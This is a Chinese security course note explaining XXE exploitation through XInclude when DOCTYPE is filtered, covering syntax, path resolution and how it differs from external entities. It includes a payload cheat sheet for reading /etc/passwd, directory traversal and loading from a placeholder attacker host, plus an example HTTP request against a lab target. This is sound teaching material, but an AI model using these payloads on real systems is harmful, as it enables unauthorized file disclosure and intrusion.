---
title: XXE 之 XInclude 利用
category: XXE/利用
tags: [XXE, XInclude, xi:include, 命名空间, 目录遍历, 无DTD]
source: 课程笔记 2025-10-19
date: 2025-10-19
order: 5
---

## 一句话概括

当 `<!DOCTYPE>` 被过滤、实体用不了的时候，还有一条路：**XInclude**。它不靠 DTD 实体，而是在 XML 里直接写一个 `<xi:include href="..."/>` 元素，让处理器把外部资源「拼」进当前文档 —— **相当于没有命名变量、直接通过 URI 把内容引用进来**。

## 原理

### 1. 核心思想：用 URI 直接引用内容

外部实体是「先声明一个名字，再用 `&名字;` 引用」；XInclude 是「**没有中间变量，直接用地址引用**」。

原笔记的类比非常准确：

> 非常准确！XInclude 的核心就是通过一个直接的 **URI（统一资源标识符）** 来引用内容，这就像通过 IP 地址直接访问服务器一样。这个 URI 可以是本地文件路径（如 `file:///data/config.xml`），也可以是远程 HTTP 地址（如 `http://example.com/data.xml`）。

（笔记原句里在讨论「ip 指向默认但可修改」，指的就是 `href` 里的地址是可以换成任意路径的 —— 换成 `../../` 就变成目录遍历。）

### 2. 基本语法与格式

要用 XInclude，只需要做两件事：

1. **声明 XInclude 命名空间**
2. **使用 `<xi:include>` 元素**

```xml
<!-- 1. 在根元素上声明 XInclude 命名空间 -->
<book xmlns:xi="http://www.w3.org/2001/XInclude">
  <title>我的书籍</title>
  <author>张三</author>

  <!-- 2. 使用 xi:include 元素引入外部文件 -->
  <xi:include href="chapter1.xml"/>
  <xi:include href="chapter2.xml"/>
  <xi:include href="common/footer.xml"/>

</book>
```

### 3. 语法详解

**命名空间声明：**

```xml
xmlns:xi="http://www.w3.org/2001/XInclude"
```

这行定义了一个名为 `xi` 的命名空间，URI 指向 W3C 的 XInclude 规范。`xi` 是通用前缀，你也可以用其他名字（如 `inc`），但 `xi` 是约定俗成的。

**`<xi:include>` 元素的属性：**

| 属性 | 必需 | 说明 |
|---|:---:|---|
| `href` | **必需** | 指定要包含的资源的 URI。可以是相对路径、绝对路径或完整的 URL |
| `parse` | 可选 | 解析方式。`"xml"`（默认）把目标当 XML 解析后插入整个文档结构；`"text"` 把目标当**纯文本**，整个内容作为一个文本节点插入 |
| `xpointer` | 可选 | 只包含源文档中的**某一部分**，而不是整个文档。使用 XPointer 表达式（功能强大，但并非所有解析器都完全支持） |

### 4. 命名空间的真正作用

```xml
<book xmlns:xi="http://www.w3.org/2001/XInclude">
```

这行代码的意思是：

- 「我在这里声明一个前缀 `xi`」
- 「所有以 `xi:` 开头的元素都属于 `http://www.w3.org/2001/XInclude` 这个『家族』或『规范』」
- 「XML 处理器看到这个命名空间，就知道要按照 W3C 的 XInclude 标准来处理这些元素」

**为什么非要走命名空间这一层？** 想象没有命名空间的情况：

```xml
<data>
    <title>我的文档</title>
    <include href="content.xml"/>   <!-- 处理器：这是个普通标签？还是指令？ -->
</data>
```

处理器无法区分这到底是一个名为 `include` 的数据字段，还是一个应该执行的包含指令。加上命名空间后就泾渭分明：

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <title>我的文档</title>          <!-- 普通数据元素 -->
    <xi:include href="content.xml"/> <!-- 特殊处理指令 -->
</data>
```

### 5. `href="chapter1.xml"` 到底从哪里加载

**答案：它是一个相对路径，从当前 XML 文件所在的位置开始解析。**

假设文件结构：

```text
/projects/my-book/
├── book.xml          (主文档)
└── chapter1.xml      (被包含的文件)
```

在 `book.xml` 中写 `<xi:include href="chapter1.xml"/>`，XML 处理器会在 **`/projects/my-book/`** 目录下寻找 `chapter1.xml`。

详细解释（以 HTTP 场景为例）：

- 网站 URL：`http://example.com/books/mybook/page.xml`
- 这个 URL 返回的 XML 内容中包含：`<xi:include href="chapter1.xml"/>`

解析步骤：

**第 1 步：建立「基础 URL」** —— 浏览器/客户端请求 `http://example.com/books/mybook/page.xml` 时，会自动把当前页面路径作为解析所有相对路径的基准：

```text
基础URL = http://example.com/books/mybook/
```

**第 2 步：自动补全相对路径** —— 处理器看到 `href="chapter1.xml"` 时，与基础 URL 组合：

```text
http://example.com/books/mybook/ + chapter1.xml = http://example.com/books/mybook/chapter1.xml
```

**第 3 步：向补全后的 URL 发起请求** —— 处理器实际上会向 `http://example.com/books/mybook/chapter1.xml` 发起 HTTP 请求来获取内容。

> **这就是攻击点**：既然是「相对路径 + 可以换成绝对路径」，那就把它换成 `file:///etc/passwd`，或者用 `../../../../etc/passwd` 做目录遍历。

### 6. 与外部实体的区别

| 特性 | 外部实体 | XInclude |
|---|---|---|
| **语法与声明** | 需要在 DTD 中声明 | 使用独立的命名空间和元素 |
| **包含方式** | 基于实体引用 `&entity;` | 基于 XML 元素 `<xi:include>` |
| **错误处理** | 很差，实体加载失败可能导致解析失败 | 良好，支持 `xi:fallback` |
| **选择性包含** | 无，只能包含整个文档 | 支持，可使用 XPointer 包含文档片段 |

#### 语法格式对比

**外部实体（DTD-based）：**

```xml
<!DOCTYPE root [
    <!ENTITY external_file SYSTEM "file.txt">
]>
<root>
    <content>&external_file;</content>
</root>
```

处理过程：解析器看到 `&external_file;` → 立即加载 `file.txt` 的内容 → 替换到实体引用位置。**如果文件不存在，解析失败。**

**XInclude（Namespace-based）：**

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file.xml" parse="xml"/>
    <xi:include href="file.txt" parse="text"/>
</root>
```

处理过程：处理器看到 `<xi:include>` 元素 → 尝试加载指定资源 → **如果失败可以执行 fallback 内容** → 按指定方式插入。

#### 三点具体差异

**① 错误处理**

外部实体（脆弱）：

```xml
<!ENTITY critical_config SYSTEM "/etc/config.xml">
<!-- 如果文件不存在，整个XML解析失败 -->
```

XInclude（健壮）：

```xml
<xi:include href="/etc/config.xml">
    <xi:fallback><error>配置文件丢失</error></xi:fallback>
</xi:include>
<!-- 文件不存在时使用fallback内容 -->
```

**② 选择性包含**

外部实体只能全包含：

```xml
<!ENTITY whole_document SYSTEM "data.xml">
<!-- 总是包含整个文件 -->
```

XInclude 可包含片段：

```xml
<xi:include href="data.xml" xpointer="xpointer(//user[@id='123'])"/>
<!-- 只包含ID为123的用户元素 -->
```

**③ 内容类型处理**

外部实体只能是文本方式：

```xml
<!ENTITY textfile SYSTEM "data.txt">
<!-- 内容被当作纯文本，XML标签会被转义 -->
```

XInclude 可选择解析方式：

```xml
<xi:include href="data.xml" parse="xml"/>  <!-- 作为XML解析 -->
<xi:include href="data.txt" parse="text"/> <!-- 作为纯文本 -->
```

## 利用条件

1. **应用解析用户可控的 XML**，且允许我们插入任意元素（比如把整个 XML 文档换成我们的）
2. **`<!DOCTYPE>` 被过滤 / 实体不可用** —— 这正是要换用 XInclude 的原因
3. **服务端启用了 XInclude 处理** —— XXE 场景下常见的是代码显式调用 `DOMDocument::xinclude()`，或解析时开启了 XInclude 支持。**没调用的话 `<xi:include>` 只会被当成普通元素，不会被展开**
4. **`href` 指向的资源可读**（`file://` 本地文件，或 `http://` 内网地址）

> 对比记忆：外部实体的先决条件是「`LIBXML_NOENT` 展开实体」；XInclude 的先决条件是「**处理器调用了 XInclude 处理**」。两个开关不是同一个。

## Payload 速查

| 目的 | Payload |
|---|---|
| 读根目录下文件 | `<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></data>` |
| 目录遍历 | `<xi:include href="../../../../etc/passwd" parse="text"/>` |
| 读当前目录文件 | `<xi:include href="config.xml"/>` |
| 远程加载 | `<xi:include href="http://攻击者IP/evil.xml"/>` |
| 当纯文本插入（推荐，避免 XML 结构冲突） | `<xi:include href="file:///etc/passwd" parse="text"/>` |
| 只取片段 | `<xi:include href="data.xml" xpointer="xpointer(//user[@id='123'])"/>` |
| 加载失败时兜底 | `<xi:include href="x"><xi:fallback>内容</xi:fallback></xi:include>` |

## 完整示例

### 直接读根目录（原笔记用法）

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///etc/passwd"/>
</data>
```

### 目录遍历（原笔记用法）

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="../../../../etc/passwd" parse="text"/>
</data>
```

放在真实请求里：

```http
POST /api/xmlupload HTTP/1.1
Host: 靶机地址
Content-Type: application/xml

<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///etc/passwd" parse="text"/>
</data>
```

## 踩坑与备注

- **命名空间 URI 别写错**：W3C 的 XInclude 命名空间是 `http://www.w3.org/2001/XInclude`。原笔记里另一处写成了 `http://www.w3.org/2003/XInclude`（年份笔误），**写 payload 时以 2001 为准**；部分解析器对前缀不校验，但不建议赌这个。
- **原笔记核心判断**：「由于 ip 指向默认但可修改，可改为 `../../` + 文件实现目录遍历」—— `href` 的值完全可以换成绝对路径或带 `../` 的相对路径，这是 XInclude 打目录遍历的关键。
- **`parse="text"` 更实用**：`parse="xml"`（默认）会把目标文件当 XML 解析，如果读到的是 `/etc/passwd` 这种非 XML 内容，**解析会报错**；显式写 `parse="text"` 才稳。
- **XInclude 不需要 DTD**：这正是它绕过 `<!DOCTYPE>` 过滤的价值所在 —— payload 里完全不出现 `DOCTYPE` / `ENTITY` 关键字。
- **不是所有解析器都默认开启 XInclude**：如果 `<xi:include>` 原样出现在响应里（没有被替换），说明服务端根本没调用 XInclude 处理，这条路走不通，回去试外部实体或 SVG 载体。
